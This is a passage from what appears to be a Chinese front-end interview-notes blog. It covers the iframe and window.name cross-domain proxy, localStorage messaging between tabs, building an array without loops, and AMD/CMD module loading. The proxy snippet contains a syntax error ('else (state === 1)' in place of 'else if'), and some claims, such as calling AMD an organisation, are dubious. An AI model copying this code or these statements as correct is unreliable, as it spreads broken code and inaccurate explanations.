<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> proxy = <span class="function"><span class="keyword">function</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> state = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载跨域页面</span></span><br><span class="line">    iframe.src = url;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span><br><span class="line">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (state === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span><br><span class="line">            iframe.contentWindow.location = <span class="string">'http://www.domain1.com/proxy.html'</span>;</span><br><span class="line">            state = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> (state === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="comment">// 第2次onload(同域proxy页)成功后，读取同域window.name中数据</span></span><br><span class="line">            callback(iframe.contentWindow.name);</span><br><span class="line">            destoryFrame();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destoryFrame</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">        iframe.contentWindow.close();</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求跨域b页面数据</span></span><br><span class="line">proxy(<span class="string">'http://www.domain2.com/b.html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    alert(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>proxy.html：(<a href="http://www.domain1.com/proxy...." target="_blank" rel="noopener">http://www.domain1.com/proxy....</a>)</p>
<p>中间代理页，与a.html同域，内容为空即可。</p>
</li>
<li><p>b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">'This is domain2 data!'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="同源下不同标签的页面如何进行通信"><a href="#同源下不同标签的页面如何进行通信" class="headerlink" title="同源下不同标签的页面如何进行通信"></a>同源下不同标签的页面如何进行通信</h2><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><ol>
<li><code>localstorage</code> 是浏览器多个标签共用的存储空间，所以可以用来实现多标签之间的通信(ps：<code>session</code> 是会话级的存储空间，每个标签页都是单独的）。</li>
<li><code>onstorage</code> 以及 <code>storage</code> 事件，针对都是非当前页面对 <code>localStorage</code> 进行修改时才会触发，当前页面修改 <code>localStorage</code> 不会触发监听函数。然后就是在对原有的数据的值进行修改时才会触发，比如原本已经有一个key为a 值为b的 <code>localStorage</code>，你再执行：<code>localStorage.setItem(&#39;a&#39;, &#39;b&#39;)</code>代码，同样是不会触发监听函数的。</li>
<li>要访问一个localStorage对象，页面必须来自同一个域名（子域名无效），使用同一种协议，在同一个端口上。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onstorage = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(e)&#125;</span><br><span class="line"><span class="comment">// 或者这样</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'storage'</span>, (e) =&gt; <span class="built_in">console</span>.log(e))</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h3><h3 id="h5-sharedWorker"><a href="#h5-sharedWorker" class="headerlink" title="h5 sharedWorker"></a>h5 sharedWorker</h3><hr>
<h2 id="输出长度为100的数组"><a href="#输出长度为100的数组" class="headerlink" title="输出长度为100的数组"></a>输出长度为100的数组</h2><p>不使用loop循环输入长度为100的数组，且每项的值等于它的下标，即输出：[0, 1, 2, 3, 4, 5, …];</p>
<p>首先假设可以使用循环，我们可以这样做：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  arr.push(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当不可以使用循环时，我们可能会想到使用 <code>setInterval</code> 定时器来实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [],</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> interval = setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  i &lt; <span class="number">100</span> ? arr.push(i++) : clearInterval(interval);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<p>虽然这样可以实现，但是实际上使用定时器的效率并不高，而且本题考查的也不是定时器。</p>
<p>我们可以使用 <code>map</code> 高阶函数来实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">arr = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>但是从控制键查看发现并没有得到我们需要的结果，原来 <code>JavaScript</code> 数组是稀疏数组，通过 <code>new Array()</code> 创建的数组虽然有 <code>length</code> 属性，但实际上它是一个空数组，并不存在真实的元素，所以使用 <code>map</code> 来遍历是不可行的。我们可以通过一些手段先把它转成数组，然后使用 <code>map</code> 方法。</p>
<p>比如 <code>es5</code> 的 <code>new Array(100).join(&#39;,&#39;).split(&#39;,&#39;)</code><br>或 <code>es6</code> 的 <code>fill</code> 方法：<code>new Array(100).fill(&#39;&#39;)</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>).join(<span class="string">','</span>).split(<span class="string">','</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr)</span><br><span class="line"></span><br><span class="line">arr = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="AMD、CMD、CommonJS、ES6模块化"><a href="#AMD、CMD、CommonJS、ES6模块化" class="headerlink" title="AMD、CMD、CommonJS、ES6模块化"></a>AMD、CMD、CommonJS、ES6模块化</h2><p><code>AMD</code>(异步模块定义)、<code>CMD</code>(通用模块定义)、<code>CommonJs</code> 是 <code>ES5</code> 中提供的模块化编程的方案<br><code>RequireJS</code> 遵循的是 <code>AMD</code><br><code>SeaJS</code> 遵循的是 CMD<br><code>CommonJS</code> 是服务器端js模块化的规范，<code>NodeJS</code> 是这种规范的实现<br><code>import/export</code> 是 <code>ES6</code> 中提出的模块化方案</p>
<h3 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h3><p><code>AMD</code> 是 <code>RequireJS</code> 在推广过程中对<strong>模块定义的规范化</strong>产出，它是一个概念，<code>RequireJS</code> 是对这个概念的实现。<br><code>AMD</code> 是一个组织，<code>RequireJS</code> 是在这个组织下自定义的一套脚本语言。</p>
<p><code>AMD</code> 规范通过 <code>define</code> 方法去定义模块，通过 <code>require</code> 方法去加载模块：</p>
<p><code>RequireJS</code>: 通过 <code>define()</code> 函数定义，第一个参数是一个数组，里面定义一些需要依赖的包，第二个参数是一个回调函数，通过变量来引用模块里面的方法，最后通过 <code>return</code> 来输出。</p>
<ul>
<li><p>案例1<br>define定义模块：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module1.js</span></span><br><span class="line"><span class="comment">// 定义独立的模块</span></span><br><span class="line">define(&#123;</span><br><span class="line">  methodA: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'我是module1的methodA'</span>);    </span><br><span class="line">  &#125;,</span><br><span class="line">  methodB: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'我是module1的methodB'</span>);    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// module2.js</span></span><br><span class="line"><span class="comment">// 另一种定义独立模块的方式</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    methodA: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodA'</span>);    </span><br><span class="line">    &#125;,</span><br><span class="line">    methodB: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodB'</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// module3.js</span></span><br><span class="line"><span class="comment">// 定义非独立的模块（这个模块依赖其他模块）,导入依赖时后缀名可省略</span></span><br><span class="line">define([<span class="string">'module1'</span>, <span class="string">'module2.js'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">m1, m2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    methodC: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      m1.methodA();</span><br><span class="line">      m2.methodB();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>再定义一个 <code>main.js</code>，去加载这些个模块，require加载：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">'module3.js'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">m3</span>)</span>&#123;</span><br><span class="line">  m3.methodC();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>使用方法1：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 等号右边的main指的main.js，后缀名可省略，表示入口文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">"main.js"</span> <span class="attr">src</span>=<span class="string">"require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用方法2：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>案例2 </p>
<p>设置一个全局的配置，这有利于在大型的项目中使用这种配置：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 用require引入要引入的模块，[]：里面为引入的名称，已经在main.js里面的paths设置好了</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// function()小括号里面对应[]里面值，按顺序在()给变量名</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// jquery一般用 $, bootstrap模块没有输出，函数里面可以不用变量</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 在使用的时候，只需要require我们所需的依赖即可</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">require</span>([<span class="string">'jquery'</span>,<span class="string">'bootstrap'</span>],<span class="function"><span class="keyword">function</span> (<span class="params">$</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#myModal'</span>).on(<span class="string">'shown.bs.modal'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#myInput'</span>).focus()</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局配置</span></span><br><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    <span class="comment">// 根路径设置，paths下面全部都是根据baseUrl的路径去设置</span></span><br><span class="line">    baseUrl:<span class="string">'./js/'</span>,</span><br><span class="line">    paths:&#123;</span><br><span class="line">        <span class="comment">// 引入jQuery</span></span><br><span class="line">        jquery:<span class="string">'plugin/jquery'</span>,</span><br><span class="line">        <span class="comment">// 引入bootstrap</span></span><br><span class="line">        bootstrap:<span class="string">'plugin/bootstrap'</span>,</span><br><span class="line">        <span class="comment">// a.js</span></span><br><span class="line">        a:<span class="string">'a'</span>,</span><br><span class="line">        <span class="comment">// b.js</span></span><br><span class="line">        b:<span class="string">'b'</span>,</span><br><span class="line">        <span class="comment">// 引入c.js</span></span><br><span class="line">        c:<span class="string">'c'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 用来配置不兼容的模块，意思是：该模块没有module.exports,</span></span><br><span class="line">    <span class="comment">// jquery就有module.exports输出值</span></span><br><span class="line">    shim:&#123;</span><br><span class="line">        <span class="comment">//bootstrap没有module.exports输出值，所以得放在shim</span></span><br><span class="line">        bootstrap:&#123;</span><br><span class="line">            <span class="comment">//bootstrap需要依赖jquery，所以得加deps</span></span><br><span class="line">            deps:[<span class="string">"jquery"</span>]</span><br><span class="line">            <span class="comment">// 如果该模块加载进来，需要输出一个值，那就用exports来设置，这里不用设置</span></span><br><span class="line">            <span class="comment">// exports:''</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//map"告诉RequireJS在任何模块之前，都先载入这个模块</span></span><br><span class="line">    map: &#123;</span><br><span class="line">        <span class="comment">// 这里没有设置，举个例子</span></span><br><span class="line">        <span class="comment">// '*': &#123;</span></span><br><span class="line">            <span class="comment">// 'css': 'plugins/require-css/css'</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>output: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我是module1的methodA</span><br><span class="line">我是module2的methodB</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p><code>CMD</code> 是 <code>SeaJS</code>(淘宝) 在推广过程中对<strong>模块定义的规范化</strong>产出，它是一个概念，<code>SeaJS</code> 是对这个概念的实现。<br>通过 <code>define()</code> 定义，没有依赖前置。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>); <span class="comment">// 依赖可以就近书写</span></span><br><span class="line">  a.doSomething();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'./b'</span>);   </span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>CMD中输入输出都是用 <code>define</code> 来定义的，只是输出的时候在 <code>define</code> 内部调用的是 <code>export.test = ***</code>，输入的时候 <code>define</code> 内部调用的是 <code>require(&#39;./module.js&#39;)</code>。</p>
<ul>
<li><p>案例1</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>seajs demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use(<span class="string">'./main.js'</span>); <span class="comment">// 通过seajs.use加载main.js文件</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> title = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>);</span><br><span class="line">  title.innerHTML = <span class="string">"yes it works in demo1"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>output:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"seajs demo" 会被替换成 "yes it works in demo1"</span><br></pre></td></tr></table></figure>
</li>
<li><p>案例2</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>seajs demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use(<span class="string">'./main.js'</span>); <span class="comment">// 通过seajs.use加载main.js文件</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>module1.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(exports); <span class="comment">// export: &#123;&#125;</span></span><br><span class="line">  <span class="keyword">var</span> textContent = <span class="string">'yes it works in demo2'</span>;</span><br><span class="line">  exports.text = textContent; <span class="comment">// 将需要输出的值存储在exports对象中，再输出</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>module2.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(exports, <span class="built_in">module</span>); </span><br><span class="line">  <span class="comment">// export: &#123;&#125;</span></span><br><span class="line">  <span class="comment">// module: &#123;dependencies: [], deps: &#123;&#125;, id: "http://127.0.0.1:8080/module2.js", uri: id: "http://127.0.0.1:8080/module2.js", status: 6&#125;</span></span><br><span class="line">  </span><br><span class="line">  exports.methodObj = &#123;</span><br><span class="line">    methodA: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodA'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    methodB: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodB'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> module1 = <span class="built_in">require</span>(<span class="string">'./module1.js'</span>); <span class="comment">// 导入，注意require导入的是一个对象</span></span><br><span class="line">  <span class="keyword">var</span> title = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>);</span><br><span class="line">  title.innerHTML = module1.text;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> module2 = <span class="built_in">require</span>(<span class="string">'./module2.js'</span>);</span><br><span class="line">  <span class="keyword">var</span> module2Method = module2.methodObj;</span><br><span class="line">  <span class="built_in">console</span>.log(module2Method.methodA());</span><br><span class="line">  <span class="built_in">console</span>.log(module2Method.methodB());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>output:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"seajs demo" 会被替换成 "yes it works in demo2"</span><br><span class="line"></span><br><span class="line">我是module2的methodA</span><br><span class="line">我是module2的methodB</span><br></pre></td></tr></table></figure>
</li>
<li><p>案例2(设置回调函数)</p>
<p>适用于同时引用多个模块时，通过回调参数获取到相应模块的输出</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>seajs demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use([<span class="string">'main'</span>, <span class="string">'jquery'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">main, $</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#title'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(main.showLog())</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>main.js</p>
